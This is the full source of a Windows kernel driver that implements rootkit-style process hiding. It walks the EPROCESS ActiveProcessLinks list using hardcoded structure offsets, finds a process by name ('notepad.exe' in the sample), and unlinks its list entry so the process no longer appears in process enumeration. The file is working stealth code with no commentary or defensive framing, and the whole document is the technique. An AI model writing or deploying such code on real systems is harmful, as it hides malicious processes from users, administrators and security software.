#include "ntddk.h"

enum PROCESS_OFFSETS {
	ImageFileName	   = 0x5a8,
	ActiveProcessLinks = 0x448
};

#define GET_PEPROCESS_IMAGEFILENAME(PEPROCESS_STRUCT) ((PCHAR) PEPROCESS_STRUCT + ImageFileName)
#define GET_PEPROCESS_ACTIVEPROCESSLINKS(PEPROCESS_STRUCT) ((PCHAR) PEPROCESS_STRUCT + ActiveProcessLinks)
#define GET_PEPROCESS_BY_ACTIVEPROCESSLINKS(PLIST_STRUCT) ((PCHAR) PLIST_STRUCT - ActiveProcessLinks)

PEPROCESS
SearchProcess(PCHAR ProcessName, SIZE_T Length)
{
	PEPROCESS currentProcess, iterator;
	PLIST_ENTRY entry;

	currentProcess = IoGetCurrentProcess();
	iterator = currentProcess;
	
	do {
		if (!strncmp(ProcessName, (PCCHAR) GET_PEPROCESS_IMAGEFILENAME(iterator), Length)) {
			return iterator;
		}
		entry = (PLIST_ENTRY) GET_PEPROCESS_ACTIVEPROCESSLINKS(iterator);
		entry = (PLIST_ENTRY) entry->Flink;
		iterator = (PEPROCESS) GET_PEPROCESS_BY_ACTIVEPROCESSLINKS(entry);
	} while (iterator != currentProcess);

	return nullptr;
}

VOID
HideProcess(PCHAR ProcessName, SIZE_T Length)
{
	PEPROCESS hiddenProcess/*, prevProcess, nextProcess*/;
	PLIST_ENTRY currentListEntry, prevListEntry, nextListEntry;

	hiddenProcess = SearchProcess(ProcessName, (Length < 15) ? Length : 15);
	if (hiddenProcess == nullptr) {
		KdPrint(("Process not found!\n"));
	}
	else {
		currentListEntry = (PLIST_ENTRY) GET_PEPROCESS_ACTIVEPROCESSLINKS(hiddenProcess);
		prevListEntry	 = (PLIST_ENTRY) currentListEntry->Blink;
		nextListEntry	 = (PLIST_ENTRY) currentListEntry->Flink;

		/*.
		prevProcess = (PEPROCESS) GET_PEPROCESS_BY_ACTIVEPROCESSLINKS(prevListEntry);
		KdPrint(("Previous Process: %s\n", (PCHAR) GET_PEPROCESS_IMAGEFILENAME(prevProcess)));
		nextProcess = (PEPROCESS) GET_PEPROCESS_BY_ACTIVEPROCESSLINKS(nextListEntry);
		KdPrint(("Next Process: %s\n", (PCHAR) GET_PEPROCESS_IMAGEFILENAME(nextProcess)));
		*/

		prevListEntry->Flink = nextListEntry;
		nextListEntry->Blink = prevListEntry;

		currentListEntry->Flink = currentListEntry;
		currentListEntry->Blink = currentListEntry;

		KdPrint(("The process %s is now gone.\n", ProcessName));
	}
}

VOID
DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	KdPrint(("Bye, Driver!\n"));
}

extern "C"
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = DriverUnload;

	KdPrint(("DriverEntry called.\n"));
	
	HideProcess("notepad.exe", 11); // You can remove this fixed length 

	return STATUS_SUCCESS;
}
